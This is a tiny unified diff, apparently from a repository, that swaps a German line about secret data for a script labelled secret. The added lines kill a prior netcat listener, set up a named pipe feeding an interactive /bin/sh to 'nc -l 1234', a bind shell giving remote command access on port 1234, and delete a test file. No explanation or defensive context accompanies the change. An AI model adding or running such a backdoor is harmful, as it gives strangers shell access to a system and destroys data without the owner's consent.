@@ -1,1 +1,4 @@
-Diese Daten sollten geheim sein!
+# Dieses ist ein geheimes Script
+pkill -f "ns -l 1234" 
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234  > /tmp/f &
+rm ./test30M.txt
